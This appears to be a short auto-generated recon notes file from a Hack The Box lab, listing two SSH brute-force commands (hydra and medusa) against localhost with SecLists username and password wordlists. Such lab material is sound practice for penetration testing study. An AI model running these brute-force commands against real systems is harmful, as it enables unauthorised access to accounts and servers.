```bash
[*] ssh on tcp/22

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/home/ass/Documents/GitHub/4rji/4rjinotes/htb/local/results/localhost/scans/tcp22/tcp_22_ssh_hydra.txt" ssh://localhost

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 22 -O "/home/ass/Documents/GitHub/4rji/4rjinotes/htb/local/results/localhost/scans/tcp22/tcp_22_ssh_medusa.txt" -M ssh -h localhost


```